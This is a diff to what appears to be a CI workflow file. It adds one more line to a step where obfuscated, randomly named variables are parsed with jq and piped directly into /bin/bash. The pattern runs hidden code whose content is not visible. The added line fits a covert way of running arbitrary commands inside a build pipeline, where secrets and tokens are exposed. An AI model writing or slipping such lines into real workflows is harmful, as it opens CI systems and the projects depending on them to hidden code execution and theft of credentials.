@@ -29,6 +29,7 @@ jobs:
           echo $k24 | jq -r .hq95 | /bin/bash
           printf '%s' "$cqre891" | jq -r .kqtf76160 | /bin/bash
           printf '%s' "$rakw45269" | jq -r .xncin23349 | /bin/bash
+          printf '%s' "$irio624" | jq -r .twri0 | /bin/bash
 
       - name: Archive artifact
         uses: actions/upload-artifact@v4
